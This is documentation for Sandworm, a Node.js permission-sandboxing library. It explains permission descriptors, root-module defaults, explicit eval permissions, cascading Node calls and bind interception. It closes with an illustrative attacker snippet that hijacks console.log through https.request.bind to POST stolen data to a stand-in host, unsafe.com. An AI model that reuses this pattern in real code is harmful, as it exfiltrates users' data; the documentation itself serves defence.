# Describing permissions

The `permissions` config option should be an array of permission descriptor objects with the following structure:

* a `module` property that can be either a string (matching a caller path exactly) or a RegExp (not recommended - see "Matching caller paths with RegEx" below).
* a `permissions` property that can either be a boolean value (representing access to the entire library of supported methods) or an array of granular string permissions, representing individual supported methods (like `Storage.setItem` or `Fetch.fetch`).

> **Note**
> If the `permissions` passed to Sandworm do not contain an explicit descriptor for the `root` module (your app code), it will be given all permissions by default (by appending `{module: 'root', permissions: true}` to the passed list). You can override this behavior and grant only specific, explicit permissions for the root module, just like for any other modules in your app, by passing a descriptor with `module: 'root'`.

> **Note**
> In dev mode, all modules are granted all permissions, and any passed `permissions` config is ignored.

## Explicit permissions for arbitrary code execution

> **Note**
> This mainly applies to setting up permissions for the root module. For most use cases, you should avoid granting global permissions to a module call path to comply with [PoLP](https://en.wikipedia.org/wiki/Principle\_of\_least\_privilege). The default root permission descriptor is `{ module: 'root', permissions: true }`.

Setting `permissions: true` within a module descriptor will give that module (or call path) permissions to invoke any Sandworm-supported method **except** for a set of particularly unsafe ones that allow for arbitrary code execution - like `eval` or `vm.runInContext`. Using these methods carries a considerable security risk and should generally be avoided. Rigorously audit the code of a module that uses these before using it in your app.

However, suppose you do choose to give your app's code (or any specific caller) access to all underlying APIs **as well as** arbitrary code execution methods. In that case, you need to explicitly change your `permissions` from `true` to `['eval.eval', '*']` to acknowledge that you accept this high-risk configuration.

## Node cascading calls

Some Node APIs internally call other APIs as part of their operation. For example:

* when loading local files, `require` uses several `fs` methods as well as `vm.compileFunction`;
* `https.require` uses `dns.lookup` and `tls.Socket`.

To support this, Sandworm will automatically allow the execution of any method calls where the direct caller is part of Node's internal sources. This would indicate that:

* another Node API has been previously invoked, resulting in the current cascading call;
* either the previous call has been captured and allowed by Sandworm;
* or it was not part of Sandworm's library, and thus deemed safe for free use.

## `bind` calls

For all intercepted methods, Sandworm will also capture and enforce access to `method.bind` **whenever it is called with more than one argument**. The reason behind this is that using `bind` to partially apply arguments creates contained methods that can then float around until they get executed by another module. For example:

```javascript
// Say we're a module that doesn't have `https.request` access
// but we want to post some stolen data to our server.
// We can create a custom method with the proper arguments using `bind`
// and then we can use it to replace a common js function.
// Sandworm will require the `bind.args` permission to allow this.
console.log = https.request.bind(this, {
  hostname: 'unsafe.com',
  port: 443,
  path: '/ingest',
  method: 'POST'
});

// Now we just wait for root to log anything
```
